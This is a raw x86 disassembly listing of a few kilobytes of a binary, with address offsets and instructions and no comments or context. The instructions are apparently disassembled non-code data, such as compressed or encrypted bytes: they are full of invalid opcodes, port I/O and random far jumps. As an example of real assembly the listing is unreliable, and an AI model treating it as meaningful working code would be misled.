  42acdb:	xchg   ebx,eax
  42acdc:	dec    eax
  42acdd:	jnp    0x42ad29
  42acdf:	test   BYTE PTR [edi-0x10c5ffbf],dh
  42ace5:	pop    ss
  42ace6:	into   
  42ace7:	pop    ds
  42ace8:	xchg   esi,eax
  42ace9:	jne    0x42acbb
  42aceb:	sbb    eax,0x9255271c
  42acf0:	fidiv  WORD PTR [eax-0x2f]
  42acf3:	dec    eax
  42acf4:	repz add edi,DWORD PTR [ebx+0x59]
  42acf8:	or     BYTE PTR [ebx],dl
  42acfa:	js     0x42acfd
  42acfc:	xor    eax,0x40a14a61
  42ad01:	mov    ch,0xc6
  42ad03:	jo     0x42acc4
  42ad05:	sbb    dl,BYTE PTR [ebx+0x5346149d]
  42ad0b:	push   0xa90237af
  42ad10:	mov    dh,0x8b
  42ad12:	sbb    BYTE PTR [ecx],0x4b
  42ad15:	jl     0x42ad51
  42ad17:	aad    0xb5
  42ad19:	sbb    al,0x6
  42ad1b:	jns    0x42ad36
  42ad1d:	inc    eax
  42ad1f:	repnz xor eax,0xaf546f1a
  42ad25:	push   esp
  42ad26:	add    ch,BYTE PTR [ecx-0x70]
  42ad29:	in     eax,0x84
  42ad2b:	pusha  
  42ad2c:	pop    edx
  42ad2d:	mov    dl,0xb3
  42ad2f:	mov    eax,0x8ec3baa1
  42ad34:	xor    edx,DWORD PTR [edx+0x15]
  42ad37:	aad    0xa0
  42ad39:	fld    DWORD PTR [edx+0x37c18cc8]
  42ad3f:	inc    eax
  42ad40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ad41:	imul   ebp,DWORD PTR [ebp+0xb],0xaf3a5a62
  42ad48:	mov    dl,0x9f
  42ad4a:	sahf   
  42ad4b:	cmp    DWORD PTR [ecx+0x5e],ecx
  42ad4e:	in     eax,0x2a
  42ad50:	xchg   ebx,eax
  42ad51:	mov    bl,0xd6
  42ad53:	push   esp
  42ad54:	cli    
  42ad55:	arpl   WORD PTR [edx],cx
  42ad57:	loop   0x42ad28
  42ad59:	fisub  WORD PTR [ebp+0x42]
  42ad5c:	sti    
  42ad5d:	sbb    edi,DWORD PTR ds:[ebx+0x6aa5fc6a]
  42ad64:	pusha  
  42ad65:	repz sub DWORD PTR [eax-0x5c],esi
  42ad69:	push   esp
  42ad6a:	mov    bh,0x47
  42ad6c:	jo     0x42ad47
  42ad6e:	pop    ss
  42ad6f:	in     eax,dx
  42ad70:	adc    bh,al
  42ad72:	clc    
  42ad73:	xor    DWORD PTR ds:0xffc1327d,eax
  42ad79:	sbb    ebp,edi
  42ad7b:	retf   
  42ad7c:	mov    al,0xb
  42ad7e:	ins    BYTE PTR es:[edi],dx
  42ad7f:	mov    al,ds:0xa167c070
  42ad84:	lea    ecx,[edx+0x748f420f]
  42ad8a:	out    dx,al
  42ad8b:	or     eax,0x1764b14
  42ad90:	data16 jb 0x42adb6
  42ad93:	sub    eax,0xdcd9d614
  42ad98:	(bad)  
  42ad9a:	adc    al,0xf1
  42ad9c:	dec    ecx
  42ad9d:	mov    ebp,0xe7cdc6d3
  42ada2:	test   ah,0x6c
  42ada5:	scas   al,BYTE PTR es:[edi]
  42ada6:	retf   
  42ada7:	retf   0xcad7
  42adaa:	lods   al,BYTE PTR ds:[esi]
  42adab:	mov    ebx,0x86e57c36
  42adb0:	aas    
  42adb1:	mov    ds:0x3f46ed,al
	...
  42ae16:	mov    edi,0x4a8e4af7
  42ae1b:	mov    edi,0xe6d5f7ff
  42ae20:	and    ebp,DWORD PTR [ebp+edi*8-0x5fa37d4c]
  42ae27:	retf   0x1
  42ae2a:	pop    es
  42ae2b:	add    DWORD PTR [eax],eax
  42ae2d:	add    ah,dl
  42ae2f:	ficomp WORD PTR [ecx]
  42ae31:	call   0x2218e0e9
  42ae36:	mov    esp,0x94302286
  42ae3b:	cmp    eax,DWORD PTR [ecx-0x5b]
  42ae3e:	adc    ah,BYTE PTR [ecx]
  42ae40:	xchg   DWORD PTR [esi],ebp
  42ae42:	mov    es,WORD PTR [ebp-0x47]
  42ae45:	fsubr  st,st(6)
  42ae47:	add    eax,eax
  42ae49:	daa    
  42ae4a:	lds    ecx,FWORD PTR [edx+0x24]
  42ae4d:	or     BYTE PTR [edi+0x62ad9b62],0xf3
  42ae54:	xor    al,0xd8
  42ae56:	mov    cl,0xfa
  42ae58:	jmp    0x4cf5:0x91f96e6a
  42ae5f:	(bad)  
  42ae60:	into   
  42ae61:	inc    BYTE PTR [ebx-0x78eb7bce]
  42ae67:	shr    bl,cl
  42ae69:	inc    ebx
  42ae6a:	jmp    0xb719:0x3444ef02
  42ae71:	and    ecx,ebx
  42ae73:	ins    DWORD PTR es:[edi],dx
  42ae74:	fs es daa 
  42ae77:	lds    ecx,FWORD PTR ds:0xa1c130db
  42ae7d:	jmp    0x3621:0xfeac6354
  42ae84:	out    0x5e,al
  42ae86:	xor    al,0xe9
  42ae88:	loope  0x42ae91
  42ae8a:	sbb    al,0x89
  42ae8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ae8d:	cmp    DWORD PTR [ebp-0x48],edx
  42ae90:	xchg   esp,eax
  42ae91:	push   ecx
  42ae92:	xor    esp,DWORD PTR [ebp+0x1ad5d48c]
  42ae98:	pop    ss
  42ae99:	imul   ecx,DWORD PTR [ecx],0x7eeba31e
  42ae9f:	mov    al,0xf4
  42aea1:	shl    BYTE PTR [esi+eax*8+0x2291c37a],0x89
  42aea9:	lods   eax,DWORD PTR ds:[esi]
  42aeab:	pop    ecx
  42aeac:	jno    0x42af13
  42aeae:	das    
  42aeaf:	jns    0x42aeda
  42aeb1:	inc    ecx
  42aeb2:	test   DWORD PTR [ebp-0xa28c873],ecx
  42aeb8:	into   
  42aeb9:	test   eax,0xa7d2adde
  42aebe:	das    
  42aebf:	pushf  
  42aec0:	cmp    eax,0xa99fd0c0
  42aec5:	xchg   esp,eax
  42aec6:	or     bl,bl
  42aec8:	xchg   DWORD PTR [ecx-0xb3500bc],edx
  42aece:	sahf   
  42aecf:	xchg   ecx,eax
  42aed0:	fnstsw WORD PTR [ebp+esi*2+0x57]
  42aed4:	pushf  
  42aed5:	and    bh,BYTE PTR [eax]
  42aed7:	fsubr  DWORD PTR [eax]
  42aed9:	in     al,0x5d
  42aedb:	sbb    eax,0xc86cabb2
  42aee0:	fldcw  WORD PTR [esi-0x5c]
  42aee3:	loop   0x42aef3
  42aee5:	mov    ebp,0xe7bc8900
  42aeea:	sbb    eax,0x6cc9c837
  42aeef:	mov    dl,0xed
  42aef1:	pop    ecx
  42aef2:	xor    DWORD PTR [eax-0x153738f2],edx
  42aef8:	push   eax
  42aef9:	bound  esp,QWORD PTR [ecx]
  42aefb:	idiv   BYTE PTR [edi]
  42aefd:	or     esi,DWORD PTR [ecx]
  42aeff:	lock pop es
  42af01:	push   ebp
  42af02:	hlt    
  42af03:	xchg   edi,eax
  42af04:	mov    cl,0xc9
  42af06:	pop    eax
  42af07:	in     eax,dx
  42af08:	test   dh,dl
  42af0a:	cdq    
  42af0b:	inc    ebx
  42af0c:	ret    0xe1f7
  42af0f:	jmp    0x42aefe
  42af11:	dec    edx
  42af12:	mov    al,0xb4
  42af14:	cmp    ebp,ebp
  42af16:	outs   dx,BYTE PTR ds:[esi]
  42af17:	jno    0x42aef9
  42af19:	into   
  42af1a:	dec    esi
  42af1b:	dec    edx
  42af1c:	std    
  42af1d:	dec    esi
  42af1e:	xor    esi,ecx
  42af20:	xchg   edi,eax
  42af21:	or     WORD PTR [esi-0xc],0x18
  42af26:	repz out dx,al
  42af28:	repz mov edx,0x2f81e11c
  42af2e:	push   ecx
  42af2f:	and    BYTE PTR [eiz*4+0xa27cae],ch
	...
  42af96:	stc    
  42af97:	enter  0xdc7a,0x7b
  42af9b:	(bad)  
  42af9c:	(bad)  
  42af9d:	in     eax,dx
  42af9e:	(bad)  
  42af9f:	adc    DWORD PTR [ebp+0x328aaeea],0xfffffffc
  42afa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42afa7:	retf   
  42afa8:	add    DWORD PTR [eax],eax
  42afaa:	pop    es
  42afab:	add    DWORD PTR [eax],eax
  42afad:	add    BYTE PTR [ecx],ah
  42afaf:	icebp  
  42afb0:	adc    al,0xf8
  42afb2:	jno    0x42af84
  42afb4:	cmc    
  42afb5:	scas   al,BYTE PTR es:[edi]
  42afb6:	stos   DWORD PTR es:[edi],eax
  42afb7:	sahf   
  42afb8:	cdq    
  42afb9:	outs   dx,BYTE PTR ds:[esi]
  42afba:	(bad)  
  42afbb:	retf   0xc7c4
  42afbe:	add    esi,DWORD PTR [edx-0x79]
  42afc1:	dec    eax
  42afc2:	sbb    BYTE PTR [ebp+0x22ad74fd],dh
  42afc8:	call   0x92ab:0x8450ad06
  42afcf:	loop   0x42afff
  42afd1:	test   eax,0xe1332b61
  42afd6:	push   0xffffffd5
  42afd8:	mov    DWORD PTR [esp+eiz*8+0x6bf5efa9],ecx
  42afdf:	fidivr DWORD PTR [edi]
  42afe1:	pushf  
  42afe2:	pushf  
  42afe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42afe4:	push   0x2ad040fb
  42afe9:	push   esi
  42afea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42afeb:	hlt    
  42afec:	in     al,0x34
  42afee:	stos   DWORD PTR es:[edi],eax
  42afef:	lods   al,BYTE PTR ds:[esi]
  42aff0:	jns    0x42afeb
  42aff2:	stos   BYTE PTR es:[edi],al
  42aff3:	call   0x7431:0x8b29bdb0
  42affa:	scas   eax,DWORD PTR es:[edi]
  42affb:	push   ebp
  42affc:	inc    edi
  42affd:	scas   eax,DWORD PTR es:[edi]
  42affe:	retf   0x794
  42b001:	mov    bh,0x63
  42b003:	mov    bl,0x11
  42b005:	lods   al,BYTE PTR ds:[esi]
  42b006:	xor    ebx,ebp
  42b008:	inc    esi
  42b009:	push   es
  42b00a:	inc    eax
  42b00b:	push   0x12
  42b00d:	adc    eax,0x59581829
  42b012:	jno    0x42afb3
  42b014:	sub    ecx,esp
  42b016:	dec    ecx
  42b017:	fidiv  WORD PTR [eax-0x7ba3202c]
  42b01d:	mov    al,ds:0x59ea27a
  42b022:	mov    bl,0x58
  42b024:	or     BYTE PTR [eax+0x48344ddb],ah
  42b02a:	jne    0x42b00c
  42b02c:	lods   al,BYTE PTR ds:[esi]
  42b02d:	sbb    dh,BYTE PTR [eax]
  42b02f:	jg     0x42b025
  42b031:	cmp    dh,0x7f
  42b034:	push   edi
  42b035:	xchg   edx,eax
  42b036:	std    
  42b037:	and    al,BYTE PTR [ebp-0x6822fd1]
  42b03d:	mov    al,0x59
  42b03f:	in     eax,dx
  42b040:	cmp    eax,0xb55cb495
  42b045:	add    edi,0x6a
  42b048:	in     eax,0x89
  42b04a:	je     0x42b02a
  42b04c:	int    0x7d
  42b04e:	int    0x3f
  42b050:	mov    WORD PTR [eax+eax*2-0x74],ss
  42b054:	jo     0x42b0b0
  42b056:	push   cs
  42b057:	iret   
  42b058:	mov    al,ds:0xf9f50fab
  42b05d:	dec    esi
  42b05e:	push   ebx
  42b05f:	scas   al,BYTE PTR es:[edi]
  42b060:	out    0x47,al
  42b062:	xor    dl,BYTE PTR [ebx+0x2b]
  42b065:	and    edi,DWORD PTR [ecx+0x2]
  42b068:	je     0x42b04c
  42b06a:	cmc    
  42b06b:	lock rcl esp,0xbb
  42b06f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b070:	ds push esi
  42b072:	cmp    eax,0xf536c3f1
  42b077:	inc    edi
  42b078:	rol    BYTE PTR [eax-0x6438c0e6],0xc0
  42b07f:	cmp    DWORD PTR [ebx],esp
  42b081:	sbb    al,0x2e
  42b083:	pop    ecx
  42b084:	in     eax,dx
  42b085:	or     BYTE PTR [ecx+0x25],dh
  42b088:	aas    
  42b089:	ret    
  42b08a:	out    dx,eax
  42b08b:	push   ds
  42b08c:	jb     0x42b0d0
  42b08e:	mov    esi,0xb551c0eb
  42b093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b094:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b095:	rcr    ebp,0xb5
  42b098:	jl     0x42b112
  42b09a:	out    dx,eax
  42b09b:	cli    
  42b09c:	mov    ecx,0x62314c8c
  42b0a1:	jmp    0xe13e:0x7f9c57fd
  42b0a8:	jo     0x42b0d6
  42b0aa:	mov    cl,0x57
  42b0ac:	adc    al,bh
  42b0ae:	jle    0x42b051
  42b0b0:	sub    al,0x62
  42b0b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b0b3:	into   
  42b0b4:	lds    eax,FWORD PTR [eax]
	...
  42b116:	jne    0x42b13d
  42b118:	imul   ebx,DWORD PTR [edi-0x51]
  42b11c:	cmc    
  42b11d:	(bad)  
  42b11e:	dec    DWORD PTR [edi+0x128c80ad]
  42b124:	inc    esp
  42b125:	xor    ch,BYTE PTR [esi+0x70001cc]
  42b12b:	add    DWORD PTR [eax],eax
  42b12d:	add    BYTE PTR [ebx],bl
  42b12f:	bound  eax,QWORD PTR [ecx-0x5]
  42b132:	icebp  
  42b133:	inc    ebp
  42b134:	inc    ebp
  42b135:	xor    ebp,DWORD PTR [ebx+0x4b0134af]
  42b13b:	call   0x53c9e87e
  42b140:	stos   BYTE PTR es:[edi],al
  42b141:	mov    ch,0xec
  42b143:	imul   ebp,eax,0xfffffffa
  42b146:	or     al,bh
  42b148:	xor    ebp,esp
  42b14a:	sub    eax,0x8020e4
  42b14f:	fs jns 0x42b1b7
  42b152:	jle    0x42b150
  42b154:	aaa    
  42b155:	push   cs
  42b156:	enter  0x48b7,0x89
  42b15a:	fdiv   DWORD PTR [eax-0x4b]
  42b15d:	fadd   st(7),st
  42b15f:	push   edi
  42b160:	cmp    dl,ch
  42b162:	cmp    esp,esp
  42b164:	popa   
  42b165:	cmp    eax,0x54c9575e
  42b16a:	arpl   di,ax
  42b16c:	mov    ds:0x72fa22ad,al
  42b171:	fild   QWORD PTR [edi+0x6fc9c61e]
  42b177:	inc    esp
  42b178:	cmc    
  42b179:	cmp    al,0xb0
  42b17b:	std    
  42b17c:	sbb    edx,DWORD PTR [ecx]
  42b17e:	repnz sub al,BYTE PTR ss:[edx+0x6e85e1e4]
  42b186:	out    0x65,eax
  42b188:	daa    
  42b189:	inc    eax
  42b18a:	xor    BYTE PTR [eax],ch
  42b18c:	push   ds
  42b18d:	mov    ebp,0xcc2fd23f
  42b192:	add    eax,0x75273987
  42b197:	or     esp,DWORD PTR [edi+ecx*8+0x3a024930]
  42b19e:	lock push edi
  42b1a0:	loopne 0x42b1d6
  42b1a2:	adc    dh,BYTE PTR [esi]
  42b1a4:	adc    edi,DWORD PTR [esi-0x16]
  42b1a7:	sbb    al,0x1b
  42b1a9:	dec    ebx
  42b1aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b1ab:	xchg   esi,eax
  42b1ac:	ret    0xfe53
  42b1af:	pop    ebx
  42b1b0:	loop   0x42b22b
  42b1b2:	test   BYTE PTR [esi],ch
  42b1b4:	cs dec ebp
  42b1b6:	call   0xfb0f:0xed36c7c9
  42b1bd:	fisttp QWORD PTR [ecx-0x1c]
  42b1c0:	lahf   
  42b1c1:	sub    al,0x9d
  42b1c3:	push   ss
  42b1c4:	popa   
  42b1c5:	popf   
  42b1c6:	lods   al,BYTE PTR ds:[esi]
  42b1c7:	test   ecx,ecx
  42b1c9:	inc    edx
  42b1ca:	sbb    bl,ch
  42b1cc:	js     0x42b1d2
  42b1ce:	xor    BYTE PTR [ecx],dh
  42b1d0:	dec    edx
  42b1d1:	sub    dl,BYTE PTR [ebx+0x3a]
  42b1d4:	ins    BYTE PTR es:[edi],dx
  42b1d5:	(bad)  
  42b1d6:	adc    al,0x43
  42b1d8:	les    esp,FWORD PTR [esi]
  42b1da:	jne    0x42b1bc
  42b1dc:	cmc    
  42b1dd:	adc    al,0x71
  42b1df:	inc    edx
  42b1e0:	cdq    
  42b1e1:	push   esi
  42b1e2:	mov    edi,0x1fe5f0b
  42b1e7:	and    BYTE PTR gs:[esi+ebx*1+0x154a0f7c],cl
  42b1ef:	cli    
  42b1f0:	dec    ecx
  42b1f1:	mov    ah,0x4
  42b1f3:	cmp    BYTE PTR [ebp-0x2197c1e9],ah
  42b1f9:	ror    dh,0xb
  42b1fc:	fnsave [edi]
  42b1fe:	js     0x42b1ad
  42b200:	sub    ebx,DWORD PTR [ecx]
  42b202:	dec    ebp
  42b203:	hlt    
  42b204:	aas    
  42b205:	jmp    0xe8d4:0x141cd03b
  42b20c:	mov    edi,0xd2521891
  42b211:	add    eax,0xf6b0b0f3
  42b216:	addr16 dec ebp
  42b218:	jle    0x42b19a
  42b21a:	(bad)  
  42b21b:	stos   DWORD PTR es:[edi],eax
  42b21c:	rcr    DWORD PTR [eax+0xd],1
  42b21f:	lea    edx,[ebp+0x70]
  42b222:	cmp    DWORD PTR [edx+edx*4+0x6e],edx
  42b226:	sbb    BYTE PTR [eiz*8+0x4802a8],0x26
  42b22e:	repz jmp 0x42b289
  42b231:	jecxz  0x42b25f
  42b233:	mov    ?,WORD PTR [esi+0x0]
	...
  42b295:	add    BYTE PTR [ebp-0x449f6672],ah
  42b29b:	ja     0x42b29a
  42b29d:	iret   
  42b29e:	arpl   dx,si
  42b2a0:	or     BYTE PTR [ebp+0x70],ch
  42b2a3:	push   ds
  42b2a4:	out    0x35,eax
  42b2a6:	mov    ch,0xcd
  42b2a8:	add    DWORD PTR [eax],eax
  42b2aa:	pop    es
  42b2ab:	add    DWORD PTR [eax],eax
  42b2ad:	add    BYTE PTR [edx-0x704767b9],bh
  42b2b3:	test   BYTE PTR [esi-0x39],dh
  42b2b6:	push   eax
  42b2b7:	in     al,0x2c
  42b2b9:	sbb    bh,0xf1
  42b2bc:	stc    
  42b2bd:	lds    ebp,FWORD PTR ds:0x2679ce55
  42b2c3:	dec    edx
  42b2c4:	or     esi,DWORD PTR [esi-0x2e]
  42b2c7:	(bad)  
  42b2c8:	mov    bh,0x2b
  42b2ca:	xchg   ebp,eax
  42b2cb:	jl     0x42b321
  42b2cd:	fst    DWORD PTR [ebx-0x57]
  42b2d0:	jge    0x42b274
  42b2d2:	inc    edi
  42b2d3:	pop    ss
  42b2d4:	call   0x905590f0
  42b2d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b2da:	cmp    DWORD PTR [esi-0x74],0x29
  42b2de:	inc    eax
  42b2df:	sbb    DWORD PTR [eax],eax
  42b2e1:	add    BYTE PTR [edx],0x29
  42b2e4:	rol    cl,cl
  42b2e6:	or     DWORD PTR [ecx+0x5a6c4ac5],0x39088ef
  42b2f0:	add    al,0xca
  42b2f2:	ins    DWORD PTR es:[edi],dx
  42b2f3:	fwait
  42b2f4:	dec    eax
  42b2f5:	sub    al,0x26
  42b2f7:	jae    0x42b331
  42b2f9:	sub    bh,ah
  42b2fb:	test   DWORD PTR [ecx-0x7d82d8b5],edx
  42b301:	(bad)  
  42b302:	mov    ebp,0x74d03200
  42b307:	lahf   
  42b308:	mov    ecx,0x8924a32d
  42b30d:	sub    al,BYTE PTR [esi]
  42b30f:	loopne 0x42b31b
  42b311:	mov    ch,0x3c
  42b313:	xchg   BYTE PTR [eax-0x1026ba40],ah
  42b319:	jp     0x42b2ac
  42b31b:	xchg   ecx,eax
  42b31c:	dec    eax
  42b31d:	add    BYTE PTR [esi],bl
  42b31f:	jno    0x42b320
  42b321:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b322:	mov    ch,0xc9
  42b324:	in     al,dx
  42b325:	adc    bl,bl
  42b327:	push   es
  42b328:	jmp    0x42b340
  42b32a:	push   ebx
  42b32b:	(bad)  
  42b32c:	push   ss
  42b32d:	jle    0x42b2b7
  42b32f:	rol    BYTE PTR [edi+0x6ad9a822],0x9
  42b336:	dec    ebx
  42b337:	sbb    DWORD PTR [ebx],0x5a22cc35
  42b33d:	es xor eax,0x3dca22d
  42b343:	hlt    
  42b344:	mov    esi,0x10e14790
  42b349:	inc    DWORD PTR [esi+ecx*1-0xa]
  42b34d:	inc    esp
  42b34e:	xchg   esi,eax
  42b34f:	fcom   QWORD PTR [esi]
  42b351:	sbb    BYTE PTR [esi-0x4a47902d],ah
  42b357:	outs   dx,BYTE PTR ds:[esi]
  42b358:	scas   al,BYTE PTR es:[edi]
  42b359:	xchg   edi,eax
  42b35a:	push   esp
  42b35b:	out    0x40,al
  42b35d:	popf   
  42b35e:	jbe    0x42b342
  42b360:	or     esi,DWORD PTR [ebx]
  42b362:	xor    al,0xe0
  42b364:	sbb    cl,BYTE PTR ds:0x23f14038
  42b36a:	les    esi,FWORD PTR [edi-0x6f]
  42b36d:	push   ebx
  42b36e:	sbb    eax,0xb41aae71
  42b373:	cmc    
  42b374:	dec    esp
  42b375:	in     al,0x19
  42b377:	xor    cl,bl
  42b379:	cmp    DWORD PTR [esi],ebp
  42b37b:	sbb    bh,0xc6
  42b37e:	jecxz  0x42b3f0
  42b380:	pop    edi
  42b381:	mov    ebx,0xfe8c3240
  42b386:	xchg   ebx,eax
  42b387:	ja     0x42b3c9
  42b389:	inc    ecx
  42b38a:	jl     0x42b3e3
  42b38c:	aaa    
  42b38d:	pop    ebx
  42b38e:	frndint 
  42b390:	inc    esp
  42b391:	ret    0x49a2
  42b394:	jnp    0x42b3d5
  42b396:	pop    esi
  42b397:	adc    DWORD PTR [ebx*8-0x59e1d3ac],ecx
  42b39e:	outs   dx,BYTE PTR ds:[esi]
  42b39f:	cmp    ebp,DWORD PTR [edx+esi*4]
  42b3a2:	clc    
  42b3a3:	dec    esi
  42b3a4:	into   
  42b3a5:	add    al,0xd6
  42b3a7:	fisttp DWORD PTR [edx+0x78]
  42b3aa:	fbstp  TBYTE PTR [edi+ebp*4+0x25]
  42b3ae:	pop    ebp
  42b3af:	(bad)  
  42b3b0:	mul    BYTE PTR [eax+0x4e57c0]
	...
  42b416:	mov    al,BYTE PTR [ebp+0x20]
  42b419:	out    dx,al
  42b41a:	out    dx,eax
  42b41b:	out    dx,eax
  42b41c:	into   
  42b41d:	shl    BYTE PTR gs:[esp+esi*8+0x42],0x65
  42b423:	test   DWORD PTR ds:0x1cebcb1,ebp
  42b429:	add    BYTE PTR [edi],al
  42b42b:	add    DWORD PTR [eax],eax
  42b42d:	add    BYTE PTR [ebx-0x3668574d],dh
  42b433:	fwait
  42b434:	cmc    
  42b435:	and    bl,al
  42b437:	std    
  42b438:	xor    eax,0x6506a0a1
  42b43d:	repz pop ds
  42b43f:	xor    eax,0x29214bb6
  42b444:	not    BYTE PTR [ebx+0x5dedd123]
  42b44a:	popa   
  42b44b:	mov    dl,0xf0
  42b44d:	fmul   QWORD PTR [ebp+0x53]
  42b450:	sbb    eax,0x90556f31
  42b455:	xchg   ebx,eax
  42b456:	adc    BYTE PTR [edx+eiz*1+0x5c],dl
  42b45a:	jge    0x42b4d3
  42b45c:	pusha  
  42b45d:	(bad)  
  42b45e:	clc    
  42b45f:	retf   
  42b460:	(bad)  
  42b461:	pop    eax
  42b462:	pop    eax
  42b463:	rcl    al,cl
  42b465:	ins    BYTE PTR es:[edi],dx
  42b466:	pop    ss
  42b467:	test   BYTE PTR [edi],cl
  42b469:	popf   
  42b46a:	ret    0xec2c
  42b46d:	stc    
  42b46e:	aam    0x62
  42b470:	pop    edx
  42b471:	cmp    DWORD PTR [esi],ebp
  42b473:	jmp    0xea8ef4a0
  42b478:	inc    edi
  42b479:	add    BYTE PTR [edi+0x4a83be2e],dh
  42b47f:	mov    ah,0xc6
  42b481:	mov    eax,DWORD PTR [eax]
  42b483:	test   DWORD PTR [esi-0x65223e5a],0x6fa47838
  42b48d:	mov    esp,0xe3ee77fe
  42b492:	adc    dh,ch
  42b494:	mov    ebp,0x88b8b8ba
  42b499:	(bad)  
  42b49b:	sbb    esi,DWORD PTR [ecx+eax*2]
  42b49e:	in     al,0x2f
  42b4a0:	out    0x2e,eax
  42b4a2:	ror    BYTE PTR [ebp+ecx*8+0x7b],0x83
  42b4a7:	vminss xmm7,xmm2,xmm0
  42b4ab:	leave  
  42b4ac:	push   ebx
  42b4ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b4ae:	leave  
  42b4af:	jge    0x42b447
  42b4b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b4b2:	xchg   ebp,eax
  42b4b3:	inc    esi
  42b4b4:	inc    ebx
  42b4b5:	pop    edx
  42b4b6:	std    
  42b4b7:	ror    DWORD PTR [ecx+0x3a88ef19],1
  42b4bd:	pop    esp
  42b4be:	aam    0x6a
  42b4c0:	mov    al,ds:0x8571f1c1
  42b4c5:	dec    edi
  42b4c6:	hlt    
  42b4c7:	add    DWORD PTR [edi+0x66],ebp
  42b4ca:	and    eax,0xf6a357dd
  42b4cf:	in     al,dx
  42b4d0:	adc    al,0xd9
  42b4d2:	xchg   esp,eax
  42b4d3:	pop    ebp
  42b4d4:	repnz cmp BYTE PTR [eax-0x1d],bl
  42b4d8:	and    eax,0x4e0f7646
  42b4dd:	xchg   BYTE PTR [esi],dl
  42b4df:	and    al,BYTE PTR [ebx+0x2b]
  42b4e2:	test   BYTE PTR [ebp+ebp*1-0x5d],cl
  42b4e6:	(bad)  
  42b4e7:	jns    0x42b553
  42b4e9:	int    0x27
  42b4eb:	mov    DWORD PTR [edi+0x73c42897],ebp
  42b4f1:	lock inc edi
  42b4f3:	cmp    BYTE PTR [esi],cl
  42b4f5:	lods   al,BYTE PTR ds:[esi]
  42b4f6:	pushf  
  42b4f7:	int    0xae
  42b4f9:	xor    edx,DWORD PTR [eax+ebx*1+0x69351691]
  42b500:	cmp    DWORD PTR [eax],0x40
  42b503:	stos   DWORD PTR es:[edi],eax
  42b504:	mov    edx,0xa96cd661
  42b509:	or     BYTE PTR [eax-0x1f],ah
  42b50c:	or     esi,DWORD PTR [ecx+0x53e35993]
  42b512:	mov    ch,BYTE PTR [edi+0x268f86a0]
  42b518:	inc    ebp
  42b519:	int    0x1e
  42b51b:	imul   esi,ecx,0x13
  42b51e:	sub    DWORD PTR [esi+0x6a],eax
  42b521:	idiv   BYTE PTR [ebp-0x21]
  42b524:	sti    
  42b525:	out    dx,eax
  42b526:	lea    edi,[ebx-0x12c4afbf]
  42b52c:	mov    ds:0x5bfd5508,eax
  42b531:	call   0x0:0xcfcb6d
	...
  42b594:	add    BYTE PTR [eax],al
  42b596:	loopne 0x42b52c
  42b598:	and    bh,cl
  42b59a:	je     0x42b59b
  42b59c:	out    dx,eax
  42b59d:	mov    edi,0xcf8f6ca5
  42b5a2:	test   al,0xb4
  42b5a4:	lahf   
  42b5a5:	jge    0x42b56a
  42b5a7:	iret   
  42b5a8:	add    DWORD PTR [eax],eax
  42b5aa:	pop    es
  42b5ab:	add    DWORD PTR [eax],eax
  42b5ad:	add    BYTE PTR [eax+esi*2-0x3dfe43d1],ah
  42b5b4:	sbb    ch,BYTE PTR [edi+ebx*8-0x2e1d72e3]
  42b5bb:	je     0x42b592
  42b5bd:	and    BYTE PTR [ebp+0x3d],0xc9
  42b5c1:	(bad)  
  42b5c3:	dec    BYTE PTR [edx-0x69808d33]
  42b5c9:	mov    ebp,0x16596ced
  42b5ce:	push   0xc2c14f48
  42b5d3:	mov    esi,0x84056809
  42b5d8:	aaa    
  42b5d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b5da:	clc    
  42b5db:	sti    
  42b5dc:	pop    ebx
  42b5dd:	push   ss
  42b5de:	ins    DWORD PTR es:[edi],dx
  42b5df:	inc    ecx
  42b5e0:	(bad)  
  42b5e1:	sahf   
  42b5e2:	inc    DWORD PTR [ecx*4-0x84f67ef]
  42b5e9:	add    DWORD PTR [edx+0x621bed92],edx
  42b5ef:	loope  0x42b5a2
  42b5f1:	bound  ebx,QWORD PTR [edx+ebp*1+0x6]
  42b5f5:	test   al,0xe6
  42b5f7:	in     eax,0x5e
  42b5f9:	retf   
  42b5fa:	std    
  42b5fb:	and    cl,BYTE PTR [esi]
  42b5fd:	mov    eax,ds:0x34051b38
  42b602:	sbb    ebp,DWORD PTR [edi-0x16]
  42b605:	lock xor BYTE PTR [esi+0x65aa7c06],dh
  42b60c:	data16 xor bl,BYTE PTR cs:[edx]
  42b610:	or     ebp,DWORD PTR [ecx+ecx*1+0x522e0251]
  42b617:	repz mov esp,0x6e034f95
  42b61d:	out    0x47,al
  42b61f:	xchg   ebp,eax
  42b620:	xor    BYTE PTR [ebx+0x66],dl
  42b623:	add    al,0x4e
  42b625:	pop    edx
  42b626:	ror    dh,cl
  42b628:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b629:	stos   BYTE PTR es:[edi],al
  42b62a:	in     al,dx
  42b62b:	push   eax
  42b62c:	or     esp,DWORD PTR [ecx+0x1eeb4611]
  42b632:	xchg   edi,eax
  42b633:	dec    eax
  42b634:	adc    eax,ecx
  42b636:	mov    edi,0x183c2e47
  42b63b:	and    eax,0xe758cc18
  42b641:	into   
  42b642:	aam    0xa5
  42b644:	ds scas al,BYTE PTR es:[edi]
  42b646:	add    dl,dh
  42b648:	push   ecx
  42b649:	and    ah,BYTE PTR [ecx+0x54dcca00]
  42b64f:	out    dx,eax
  42b650:	add    esp,DWORD PTR [edi+0x5b]
  42b653:	push   ebp
  42b654:	pop    edi
  42b655:	leave  
  42b656:	and    cl,BYTE PTR [ebp+0x53a32eac]
  42b65c:	inc    DWORD PTR [ebx]
  42b65e:	xchg   ecx,eax
  42b65f:	adc    al,0xf9
  42b661:	imul   esp,DWORD PTR [eax+ecx*4+0x9de65dc],0xffffffcd
  42b669:	adc    al,0x3c
